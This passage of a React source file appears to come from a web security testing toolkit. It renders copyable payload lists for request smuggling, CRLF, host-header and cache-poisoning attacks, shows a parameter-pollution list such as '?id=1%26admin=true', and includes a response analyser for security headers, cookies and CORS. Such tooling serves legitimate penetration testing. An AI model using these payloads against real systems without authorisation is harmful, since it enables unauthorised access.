  { payload: "Transfer-Encoding: chunked, identity", desc: "TE confusion for cache deception" },
];

const HPP_PAYLOADS = [
  { payload: "?id=1&id=2", desc: "Duplicate param (server picks first or last)" },
  { payload: "?id=1&id=2&id=3", desc: "Triple param pollution" },
  { payload: "?id[]=1&id[]=2", desc: "Array notation (PHP)" },
  { payload: "?id=1%26admin=true", desc: "Encoded ampersand injection" },
  { payload: "?id=1;admin=true", desc: "Semicolon separator (some frameworks)" },
  { payload: "?id=1,2,3", desc: "Comma-separated values" },
];

function InjectionTab() {
  const [section, setSection] = useState("smuggling");

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
        {[
          { v: "smuggling", l: "Request Smuggling" },
          { v: "crlf", l: `CRLF Injection (${CRLF_PAYLOADS.length})` },
          { v: "host", l: `Host Attacks (${HOST_HEADER_ATTACKS.length})` },
          { v: "cache", l: "Cache Poisoning" },
          { v: "hpp", l: "Param Pollution" },
        ].map((s) => (
          <PillButton key={s.v} active={section === s.v} onClick={() => setSection(s.v)}>
            {s.l}
          </PillButton>
        ))}
      </div>

      {section === "smuggling" && (
        <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
          {SMUGGLING_PAYLOADS.map((s, i) => (
            <Card key={i} style={{ padding: 16 }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 8 }}>
                <div>
                  <div style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: "#E2E8F0", marginBottom: 4 }}>{s.title}</div>
                  <div style={{ fontFamily: mono, fontSize: 10, color: "#9CA3AF" }}>{s.desc}</div>
                </div>
                <CopyButton text={s.payload} />
              </div>
              <div style={{ background: BG_INPUT, borderRadius: 8, padding: "10px 12px", border: "1px solid rgba(255,255,255,0.04)" }}>
                <pre style={{ fontFamily: mono, fontSize: 11, color: "#E2E8F0", margin: 0, whiteSpace: "pre-wrap", lineHeight: 1.6 }}>{s.payload}</pre>
              </div>
            </Card>
          ))}
        </div>
      )}

      {section === "crlf" && (
        <Card style={{ padding: 0, overflow: "hidden" }}>
          <div style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
            <SectionTitle>CRLF Injection Payloads ({CRLF_PAYLOADS.length})</SectionTitle>
          </div>
          <div style={{ maxHeight: 500, overflow: "auto" }}>
            {CRLF_PAYLOADS.map((p, i) => (
              <PayloadRow key={i} text={p.payload} desc={p.desc} />
            ))}
          </div>
        </Card>
      )}

      {section === "host" && (
        <Card style={{ padding: 0, overflow: "hidden" }}>
          <div style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
            <SectionTitle>Host Header Attacks ({HOST_HEADER_ATTACKS.length})</SectionTitle>
          </div>
          <div style={{ maxHeight: 500, overflow: "auto" }}>
            {HOST_HEADER_ATTACKS.map((p, i) => (
              <PayloadRow key={i} text={p.payload} desc={p.desc} />
            ))}
          </div>
        </Card>
      )}

      {section === "cache" && (
        <Card style={{ padding: 0, overflow: "hidden" }}>
          <div style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
            <SectionTitle>Cache Poisoning Headers</SectionTitle>
          </div>
          {CACHE_POISON_HEADERS.map((p, i) => (
            <PayloadRow key={i} text={p.payload} desc={p.desc} />
          ))}
        </Card>
      )}

      {section === "hpp" && (
        <Card style={{ padding: 0, overflow: "hidden" }}>
          <div style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
            <SectionTitle>HTTP Parameter Pollution</SectionTitle>
          </div>
          {HPP_PAYLOADS.map((p, i) => (
            <PayloadRow key={i} text={p.payload} desc={p.desc} />
          ))}
        </Card>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab 4: Response Analyzer
// ─────────────────────────────────────────────

const SECURITY_HEADERS_CHECKS = [
  { name: "Strict-Transport-Security", good: (v) => v && /max-age\s*=\s*\d{5,}/.test(v), label: "HSTS" },
  { name: "Content-Security-Policy", good: (v) => v && !v.includes("unsafe-inline") && !v.includes("*"), label: "CSP" },
  { name: "X-Content-Type-Options", good: (v) => v && v.toLowerCase().trim() === "nosniff", label: "X-CTO" },
  { name: "X-Frame-Options", good: (v) => v && /^(DENY|SAMEORIGIN)/i.test(v.trim()), label: "X-FO" },
  { name: "X-XSS-Protection", good: (v) => v && v.includes("1"), label: "X-XSS" },
  { name: "Referrer-Policy", good: (v) => v && v !== "unsafe-url", label: "Referrer" },
  { name: "Permissions-Policy", good: (v) => !!v, label: "Perms" },
  { name: "Cross-Origin-Opener-Policy", good: (v) => v && v !== "unsafe-none", label: "COOP" },
  { name: "Cross-Origin-Embedder-Policy", good: (v) => v && v !== "unsafe-none", label: "COEP" },
  { name: "Cross-Origin-Resource-Policy", good: (v) => !!v, label: "CORP" },
];

const INFO_DISCLOSURE_HEADERS = [
  "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
  "X-Runtime", "X-Version", "X-Generator", "X-Drupal-Cache",
  "X-Debug-Token", "X-Debug-Token-Link",
];

function parseResponse(raw) {
  const lines = raw.split(/\r?\n/);
  let statusLine = "";
  const headers = {};
  const cookies = [];
  let bodyStart = -1;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (i === 0 && /^HTTP\//.test(line)) {
      statusLine = line;
      continue;
    }
    if (line.trim() === "") {
      bodyStart = i + 1;
      break;
    }
    const idx = line.indexOf(":");
    if (idx !== -1) {
      const key = line.slice(0, idx).trim();
      const val = line.slice(idx + 1).trim();
      if (key.toLowerCase() === "set-cookie") {
        cookies.push(val);
      }
      headers[key] = val;
    }
  }

  const body = bodyStart > 0 ? lines.slice(bodyStart).join("\n") : "";
  return { statusLine, headers, cookies, body };
}

function analyzeCookie(cookieStr) {
  const parts = cookieStr.split(";").map((s) => s.trim());
  const [nameVal, ...flags] = parts;
  const [name, ...valParts] = nameVal.split("=");
  const value = valParts.join("=");
  const flagsLower = flags.map((f) => f.toLowerCase());

  const checks = {
    secure: flagsLower.some((f) => f === "secure"),
    httpOnly: flagsLower.some((f) => f === "httponly"),
    sameSite: flags.find((f) => /^samesite/i.test(f)),
    path: flags.find((f) => /^path/i.test(f)),
    domain: flags.find((f) => /^domain/i.test(f)),
    expires: flags.find((f) => /^(expires|max-age)/i.test(f)),
  };

  return { name: name?.trim(), value, checks, raw: cookieStr };
}

function ResponseTab() {
  const [raw, setRaw] = useState("");
  const [analyzed, setAnalyzed] = useState(false);
  const [result, setResult] = useState(null);

  const analyze = useCallback(() => {
    const parsed = parseResponse(raw);
    const securityResults = SECURITY_HEADERS_CHECKS.map((check) => {
      const val = Object.entries(parsed.headers).find(
        ([k]) => k.toLowerCase() === check.name.toLowerCase()
      )?.[1];
      const present = val !== undefined;
      const isGood = present && check.good(val);
      return {
        ...check,
        value: val || null,
        present,
        status: !present ? "missing" : isGood ? "secure" : "warning",
      };
    });

    const infoDisclosure = INFO_DISCLOSURE_HEADERS.map((h) => {
      const val = Object.entries(parsed.headers).find(
        ([k]) => k.toLowerCase() === h.toLowerCase()
      )?.[1];
      return val ? { header: h, value: val } : null;
    }).filter(Boolean);

    const cookieAnalysis = parsed.cookies.map(analyzeCookie);

    const contentType = Object.entries(parsed.headers).find(
      ([k]) => k.toLowerCase() === "content-type"
    )?.[1];

    const corsHeaders = {};
    ["Access-Control-Allow-Origin", "Access-Control-Allow-Methods", "Access-Control-Allow-Headers",
     "Access-Control-Allow-Credentials", "Access-Control-Expose-Headers", "Access-Control-Max-Age",
    ].forEach((h) => {
      const val = Object.entries(parsed.headers).find(
        ([k]) => k.toLowerCase() === h.toLowerCase()
      )?.[1];
      if (val) corsHeaders[h] = val;
    });

    const cspValue = Object.entries(parsed.headers).find(
      ([k]) => k.toLowerCase() === "content-security-policy"
    )?.[1];

    const cacheHeaders = {};
    ["Cache-Control", "Expires", "Pragma", "Age", "ETag", "Last-Modified", "Vary"].forEach((h) => {
      const val = Object.entries(parsed.headers).find(
        ([k]) => k.toLowerCase() === h.toLowerCase()
      )?.[1];
      if (val) cacheHeaders[h] = val;
    });

    setResult({
      ...parsed,
      securityResults,
      infoDisclosure,
      cookieAnalysis,
      contentType,
      corsHeaders,
      cspValue,
      cacheHeaders,
    });
    setAnalyzed(true);
  }, [raw]);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 20 }}>
        <SectionTitle>Paste HTTP Response</SectionTitle>
        <textarea
          value={raw}
          onChange={(e) => { setRaw(e.target.value); setAnalyzed(false); }}
          placeholder={`HTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: session=abc123; Secure; HttpOnly\nX-Powered-By: Express\n\n<html>...</html>`}
          spellCheck={false}
          style={{
            width: "100%", minHeight: 180, boxSizing: "border-box", fontFamily: mono, fontSize: 12,
            lineHeight: 1.5, color: "#E5E7EB", background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)",
            borderRadius: 8, padding: "12px 14px", resize: "vertical", outline: "none",
          }}
          onFocus={(e) => { e.target.style.borderColor = `${ACCENT}55`; }}
          onBlur={(e) => { e.target.style.borderColor = "rgba(255,255,255,0.06)"; }}
        />
        <div style={{ marginTop: 10 }}>
          <button
            onClick={analyze}
            style={{
              fontFamily: heading, fontSize: 14, fontWeight: 700, color: "#0B0F18",
              padding: "10px 24px", borderRadius: 8, border: "none", cursor: "pointer",
              background: `linear-gradient(135deg, ${ACCENT} 0%, #D97706 100%)`,
              boxShadow: `0 4px 14px ${ACCENT}40`,
            }}
          >
            Analyze Response
          </button>
        </div>
      </Card>

      {analyzed && result && (
        <>
          <Card style={{ padding: 16 }}>
            <div style={{ fontFamily: mono, fontSize: 10, color: "#6B7280", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 8 }}>Status</div>
            <div style={{ fontFamily: mono, fontSize: 16, fontWeight: 700, color: "#E2E8F0" }}>{result.statusLine || "N/A"}</div>
          </Card>

          <Card style={{ padding: 0, overflow: "hidden" }}>
            <div style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
              <SectionTitle>All Headers ({Object.keys(result.headers).length})</SectionTitle>
            </div>
            <div style={{ maxHeight: 300, overflow: "auto" }}>
              {Object.entries(result.headers).map(([k, v]) => (
                <div key={k} style={{ padding: "8px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)", display: "flex", gap: 8 }}>
                  <span style={{ fontFamily: mono, fontSize: 11, color: ACCENT, fontWeight: 600, minWidth: 200 }}>{k}</span>
                  <span style={{ fontFamily: mono, fontSize: 11, color: "#D1D5DB", wordBreak: "break-all" }}>{v}</span>
                </div>
              ))}
            </div>
          </Card>

          <Card style={{ padding: 16 }}>
            <SectionTitle>Security Header Check</SectionTitle>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 8 }}>
              {result.securityResults.map((r) => (
                <div key={r.name} style={{
                  display: "flex", alignItems: "center", gap: 8, padding: "8px 12px", borderRadius: 8,
                  background: r.status === "secure" ? "rgba(52,211,153,0.06)" : r.status === "warning" ? "rgba(251,191,36,0.06)" : "rgba(248,113,113,0.06)",
                  border: `1px solid ${r.status === "secure" ? "rgba(52,211,153,0.15)" : r.status === "warning" ? "rgba(251,191,36,0.15)" : "rgba(248,113,113,0.15)"}`,
                }}>
                  <StatusDot color={r.status === "secure" ? "#34D399" : r.status === "warning" ? ACCENT : "#F87171"} />
                  <div style={{ flex: 1 }}>
                    <div style={{ fontFamily: mono, fontSize: 11, color: "#E2E8F0", fontWeight: 600 }}>{r.name}</div>
                    {r.value && <div style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", marginTop: 2, wordBreak: "break-all" }}>{r.value.substring(0, 80)}{r.value.length > 80 ? "..." : ""}</div>}
                  </div>
                  <span style={{
                    fontFamily: mono, fontSize: 9, fontWeight: 700, textTransform: "uppercase",
                    color: r.status === "secure" ? "#34D399" : r.status === "warning" ? ACCENT : "#F87171",
                  }}>
                    {r.status}
                  </span>
                </div>
              ))}
            </div>
          </Card>

          {result.cookieAnalysis.length > 0 && (
            <Card style={{ padding: 16 }}>
              <SectionTitle>Cookie Analysis ({result.cookieAnalysis.length})</SectionTitle>
              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                {result.cookieAnalysis.map((c, i) => (
                  <div key={i} style={{
                    padding: "12px 14px", borderRadius: 8,
                    background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.04)",
                  }}>
                    <div style={{ fontFamily: mono, fontSize: 12, color: ACCENT, fontWeight: 700, marginBottom: 8 }}>
                      {c.name}
                    </div>
                    <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
                      {[
                        { label: "Secure", ok: c.checks.secure },
                        { label: "HttpOnly", ok: c.checks.httpOnly },
                        { label: c.checks.sameSite || "SameSite: (not set)", ok: !!c.checks.sameSite },
                      ].map((flag) => (
                        <span key={flag.label} style={{
                          padding: "3px 8px", borderRadius: 4, fontFamily: mono, fontSize: 10, fontWeight: 600,
                          background: flag.ok ? "rgba(52,211,153,0.1)" : "rgba(248,113,113,0.1)",
                          color: flag.ok ? "#34D399" : "#F87171",
                          border: `1px solid ${flag.ok ? "rgba(52,211,153,0.2)" : "rgba(248,113,113,0.2)"}`,
                        }}>
                          {flag.ok ? "✓" : "✗"} {flag.label}
                        </span>
                      ))}
                      {c.checks.path && (
                        <span style={{ padding: "3px 8px", borderRadius: 4, fontFamily: mono, fontSize: 10, background: "rgba(255,255,255,0.04)", color: "#9CA3AF" }}>
                          {c.checks.path}
                        </span>
                      )}
                      {c.checks.domain && (
                        <span style={{ padding: "3px 8px", borderRadius: 4, fontFamily: mono, fontSize: 10, background: "rgba(255,255,255,0.04)", color: "#9CA3AF" }}>
                          {c.checks.domain}
                        </span>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </Card>
          )}

          {Object.keys(result.corsHeaders).length > 0 && (
            <Card style={{ padding: 16 }}>
              <SectionTitle>CORS Headers</SectionTitle>
              {Object.entries(result.corsHeaders).map(([k, v]) => {
                const isDangerous = (k === "Access-Control-Allow-Origin" && v === "*") ||
                  (k === "Access-Control-Allow-Credentials" && v === "true");
                return (
                  <div key={k} style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 0", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <StatusDot color={isDangerous ? "#F87171" : "#34D399"} />
                    <span style={{ fontFamily: mono, fontSize: 11, color: ACCENT, fontWeight: 600, minWidth: 240 }}>{k}</span>
                    <span style={{ fontFamily: mono, fontSize: 11, color: isDangerous ? "#F87171" : "#D1D5DB" }}>{v}</span>
                  </div>
                );
              })}
              {result.corsHeaders["Access-Control-Allow-Origin"] === "*" && result.corsHeaders["Access-Control-Allow-Credentials"] === "true" && (
                <div style={{ marginTop: 10, padding: "8px 12px", borderRadius: 6, background: "rgba(248,113,113,0.08)", border: "1px solid rgba(248,113,113,0.15)" }}>
                  <span style={{ fontFamily: mono, fontSize: 10, color: "#F87171", fontWeight: 600 }}>
                    <AlertTriangle size={12} style={{ verticalAlign: "-2px", marginRight: 4 }} />
                    CRITICAL: Allow-Origin: * with Allow-Credentials: true is a misconfiguration exploitable for credential theft!
                  </span>
                </div>
              )}
            </Card>
          )}

          {result.cspValue && (
            <Card style={{ padding: 16 }}>
              <SectionTitle>CSP Breakdown</SectionTitle>
              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                {result.cspValue.split(";").map((directive, i) => {
                  const d = directive.trim();
                  if (!d) return null;
                  const isDangerous = d.includes("unsafe-inline") || d.includes("unsafe-eval") || d.includes("*");
                  return (
                    <div key={i} style={{
                      display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", borderRadius: 6,
                      background: isDangerous ? "rgba(248,113,113,0.06)" : "rgba(52,211,153,0.04)",
                      border: `1px solid ${isDangerous ? "rgba(248,113,113,0.12)" : "rgba(255,255,255,0.04)"}`,
                    }}>
                      <StatusDot color={isDangerous ? "#F87171" : "#34D399"} />
                      <code style={{ fontFamily: mono, fontSize: 11, color: "#E2E8F0" }}>{d}</code>
                    </div>
                  );
                })}
              </div>
            </Card>
          )}

          {Object.keys(result.cacheHeaders).length > 0 && (
            <Card style={{ padding: 16 }}>
              <SectionTitle>Cache Headers</SectionTitle>
              {Object.entries(result.cacheHeaders).map(([k, v]) => (
                <div key={k} style={{ display: "flex", gap: 8, padding: "6px 0", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                  <span style={{ fontFamily: mono, fontSize: 11, color: ACCENT, fontWeight: 600, minWidth: 140 }}>{k}</span>
                  <span style={{ fontFamily: mono, fontSize: 11, color: "#D1D5DB" }}>{v}</span>
                </div>
              ))}
            </Card>
          )}

          {result.infoDisclosure.length > 0 && (
            <Card style={{ padding: 16 }}>
              <SectionTitle>
                <AlertTriangle size={14} style={{ verticalAlign: "-2px", marginRight: 6, color: "#F87171" }} />
                Information Disclosure
              </SectionTitle>
              {result.infoDisclosure.map((d, i) => (
                <div key={i} style={{
                  display: "flex", alignItems: "center", gap: 8, padding: "8px 10px", borderRadius: 6, marginBottom: 4,
                  background: "rgba(248,113,113,0.06)", border: "1px solid rgba(248,113,113,0.12)",
                }}>
                  <StatusDot color="#F87171" />
                  <span style={{ fontFamily: mono, fontSize: 11, color: "#F87171", fontWeight: 600, minWidth: 160 }}>{d.header}</span>
                  <span style={{ fontFamily: mono, fontSize: 11, color: "#D1D5DB" }}>{d.value}</span>
                </div>
              ))}
              <div style={{ fontFamily: mono, fontSize: 10, color: "#6B7280", marginTop: 8 }}>
                These headers reveal server technology details useful for attackers. Remove in production.
              </div>
            </Card>
          )}

          {result.contentType && (
            <Card style={{ padding: 16 }}>
              <SectionTitle>Content-Type</SectionTitle>
              <div style={{ fontFamily: mono, fontSize: 13, color: "#E2E8F0" }}>{result.contentType}</div>
              {result.contentType.includes("charset") ? (
                <div style={{ fontFamily: mono, fontSize: 10, color: "#34D399", marginTop: 6 }}>✓ Charset specified</div>
              ) : (
                <div style={{ fontFamily: mono, fontSize: 10, color: ACCENT, marginTop: 6 }}>⚠ No charset specified - may be vulnerable to encoding attacks</div>
              )}
            </Card>
          )}
        </>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────
// Main Component
// ─────────────────────────────────────────────

export default function Tampering() {
  const [activeTab, setActiveTab] = useState("builder");

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 20, maxWidth: 960, margin: "0 auto" }}>
      <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
        <div style={{
          width: 36, height: 36, borderRadius: 10,
          background: `${ACCENT}22`, border: `1px solid ${ACCENT}`,
          display: "flex", alignItems: "center", justifyContent: "center",
        }}>
          <Pencil size={20} color={ACCENT} strokeWidth={2} />
        </div>
        <div>
          <h1 style={{ fontFamily: heading, fontSize: 22, fontWeight: 700, color: "#F9FAFB", margin: 0, lineHeight: 1.2 }}>
            Tampering Tools
          </h1>
          <p style={{ margin: 0, fontFamily: mono, fontSize: 11, color: "#9CA3AF" }}>
            Build, tamper, inject & analyze HTTP requests and responses
          </p>
        </div>
        <ToolHelp title="Tampering" description="HTTP request builder with parameter mutation, response analysis, and code generation for cURL/Python/JS." steps={["Build an HTTP request with method, URL, headers, and body","Send the request and inspect the response","Use the tamper tab to mutate parameters for testing","Generate code snippets in cURL, Python, or JavaScript"]} tips={["Parameter mutation suggests IDOR and injection tests","Response analyzer checks security headers","Code generation makes it easy to reproduce requests"]} />
      </div>

      <div style={{ display: "flex", gap: 4, padding: 6, background: "rgba(17,21,30,0.6)", borderRadius: 10, border: "1px solid rgba(255,255,255,0.04)" }}>
        {TABS.map((t) => (
          <button
            key={t.value}
            onClick={() => setActiveTab(t.value)}
            style={{
              flex: 1, padding: "8px 12px", borderRadius: 7, border: "none", cursor: "pointer",
              fontFamily: mono, fontSize: 11, fontWeight: 600,
              background: activeTab === t.value ? `${ACCENT}15` : "transparent",
              color: activeTab === t.value ? ACCENT : "#6B7280",
              borderBottom: activeTab === t.value ? `2px solid ${ACCENT}` : "2px solid transparent",
              transition: "all 120ms",
            }}
          >
            {t.label}
          </button>
        ))}
      </div>

      {activeTab === "builder" && <BuilderTab />}
      {activeTab === "tamper" && <TamperTab />}
      {activeTab === "injection" && <InjectionTab />}
      {activeTab === "response" && <ResponseTab />}
    </div>
  );
}
